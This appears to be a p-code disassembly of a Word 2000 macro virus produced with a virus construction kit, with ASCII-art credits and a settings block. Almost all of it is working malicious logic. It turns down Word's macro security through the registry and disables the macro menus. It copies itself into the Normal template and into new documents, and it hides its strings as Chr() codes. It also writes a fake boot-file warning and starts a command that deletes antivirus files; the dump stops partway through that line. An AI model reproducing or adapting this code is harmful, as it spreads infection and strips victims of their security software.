' 	QuoteRem 0x0000 0x0060 " _|__|_|__|_   ____      ____   _________   _________   _________   ____   ____   ___   ________"
' Line #7:
' 	QuoteRem 0x0000 0x0061 "/           \ /    \    /    \ /         \ /         \ /         \ /    \ /    \ /   \ /        \"
' Line #8:
' 	QuoteRem 0x0000 0x0061 "|   ________| |     \  /     | |   ___   | |   ___   | |         | |    | |    | |   | |   _____/"
' Line #9:
' 	QuoteRem 0x0000 0x005C "|  |          |      \/      | |  /   \  | |  /   \  | |         | |    | |    | \___/ |   |"
' Line #10:
' 	QuoteRem 0x0000 0x005E "|  |________  |              | |  |   |  | |  |   |  | |__     __| |    |_|    |  ___  |   |__"
' Line #11:
' 	QuoteRem 0x0000 0x005F "|           \ |              | |  |   |  | |  |   |  |    |   |    |           | |   | |      |"
' Line #12:
' 	QuoteRem 0x0000 0x005F "|______     | |    |\  /|    | |  |   |  | |  |   |  |    |   |    |     _     | |   | |    __|"
' Line #13:
' 	QuoteRem 0x0000 0x005C "       |    | |    | \/ |    | |  |   |  | |  |   |  |    |   |    |    | |    | |   | |   |"
' Line #14:
' 	QuoteRem 0x0000 0x0060 " ______|    | |    |    |    | |  \___/  | |  \___/  |    |   |    |    | |    | |   | |   |____"
' Line #15:
' 	QuoteRem 0x0000 0x0061 "|           | |    |    |    | |         | |         |    |   |    |    | |    | |   | |        \"
' Line #16:
' 	QuoteRem 0x0000 0x0061 "\___________/ \____/    \____/ \_________/ \_________/    \___/    \____/ \____/ \___/ \________/"
' Line #17:
' 	QuoteRem 0x0000 0x005D "  |  | |  |                                                - $MOOTHiE Da HuStla [ZeroGravity]"
' Line #18:
' 	QuoteRem 0x0000 0x004C "  |__| |__|                                                - August 15, 2000"
' Line #19:
' 	QuoteRem 0x0000 0x0000 ""
' Line #20:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #21:
' 	QuoteRem 0x0000 0x0061 "$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$"
' Line #22:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #23:
' Line #24:
' 	QuoteRem 0x0000 0x0023 "Virus Creation: 10/23/00 9:14:34 PM"
' Line #25:
' 	QuoteRem 0x0000 0x0021 "$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$"
' Line #26:
' 	QuoteRem 0x0000 0x0021 "$*  Poly       = No            $*"
' Line #27:
' 	QuoteRem 0x0000 0x0021 "$*  Retro      = Yes           $*"
' Line #28:
' 	QuoteRem 0x0000 0x0021 "$*  Stealth    = High          $*"
' Line #29:
' 	QuoteRem 0x0000 0x0021 "$*  Infection  = New           $*"
' Line #30:
' 	QuoteRem 0x0000 0x0021 "$*  Payload    = Save          $*"
' Line #31:
' 	QuoteRem 0x0000 0x0021 "$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$"
' Line #32:
' Line #33:
' 	FuncDefn (Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long)
' Line #34:
' Line #35:
' 	FuncDefn (Private Sub Document_Open())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #38:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #39:
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "Macros..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub Document_New())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	QuoteRem 0x0000 0x002A "Author:   $MOOTHiE Da HuStla [Zer0Gravity]"
' Line #45:
' 	QuoteRem 0x0000 0x0013 "Name:     Sample #2"
' Line #46:
' 	QuoteRem 0x0000 0x0027 "Comments: This is a random virus sample"
' Line #47:
' 	QuoteRem 0x0000 0x000D "Origin:   USA"
' Line #48:
' 	QuoteRem 0x0000 0x005B "This Word2000 virus was created using $MOOTHiE Da HuStla's Macro Virus Creator 2000 Ver 2.0"
' Line #49:
' Line #50:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #51:
' 	Dim 
' 	VarDefn XXX1 (As Object)
' 	VarDefn XXX2 (As Object)
' 	VarDefn XXX3 (As Object)
' 	VarDefn XXX4 (As Object)
' 	VarDefn XXX5 (As Object)
' Line #52:
' 	Dim 
' 	VarDefn YYY1 (As Object)
' 	VarDefn YYY2 (As Object)
' 	VarDefn YYY3 (As Object)
' 	VarDefn YYY4 (As Object)
' 	VarDefn YYY5 (As Object)
' Line #53:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set XXX1 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld XXX1 
' 	MemLd VBProject 
' 	Set XXX2 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld XXX2 
' 	MemLd VBComponents 
' 	Set XXX3 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld XXX3 
' 	ArgsMemLd Item 0x0001 
' 	Set XXX4 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld XXX4 
' 	MemLd CodeModule 
' 	Set XXX5 
' Line #54:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set YYY1 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld YYY1 
' 	MemLd VBProject 
' 	Set YYY2 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld YYY2 
' 	MemLd VBComponents 
' 	Set YYY3 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld YYY3 
' 	ArgsMemLd Item 0x0001 
' 	Set YYY4 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld YYY4 
' 	MemLd CodeModule 
' 	Set YYY5 
' Line #55:
' Line #56:
' 	Ld YYY5 
' 	MemLd countoflines 
' 	St AAA 
' 	BoS 0x0000 
' 	Ld XXX5 
' 	MemLd countoflines 
' 	St BBB 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St CCC 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	Paren 
' 	ArgsCall Chr 0x0001 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	Paren 
' 	ArgsCall Chr 0x0001 
' Line #57:
' Line #58:
' 	Ld AAA 
' 	Ld BBB 
' 	Lt 
' 	IfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AAA 
' 	For 
' 	BoS 0x0000 
' 	Ld XXX 
' 	Ld CCC 
' 	Ld NT5 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld BBB 
' 	For 
' 	BoS 0x0000 
' 	Ld XXX 
' 	LitDI2 0x0001 
' 	Ld XXX5 
' 	ArgsMemLd lines 0x0002 
' 	St XXXA 
' 	BoS 0x0000 
' 	Ld XXX 
' 	Ld XXXA 
' 	Ld YYY5 
' 	ArgsMemCall insertlines 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #62:
' Line #63:
' Line #64:
' 	Ld BBB 
' 	Ld AAA 
' 	Lt 
' 	IfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld BBB 
' 	For 
' 	BoS 0x0000 
' 	Ld XXX 
' 	Ld CCC 
' 	Ld XXX5 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AAA 
' 	For 
' 	BoS 0x0000 
' 	Ld XXX 
' 	LitDI2 0x0001 
' 	Ld YYY5 
' 	ArgsMemLd lines 0x0002 
' 	St XXXA 
' 	BoS 0x0000 
' 	Ld XXX 
' 	Ld XXXA 
' 	Ld XXX5 
' 	ArgsMemCall insertlines 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld XXX 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #68:
' 	ArgsCall (Call) Retro 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Sub FileSave())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	LitDI2 0x0000 
' 	ArgsLd ShowCursor 0x0001 
' 	St AAA 
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0013 "Actual Save Command"
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' Line #78:
' 	FuncDefn (Private Sub Retro())
' Line #79:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St h$ 
' Line #80:
' 	Ld h$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #81:
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #82:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #83:
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St QQ$ 
' Line #84:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	Ld QQ$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #86:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #87:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
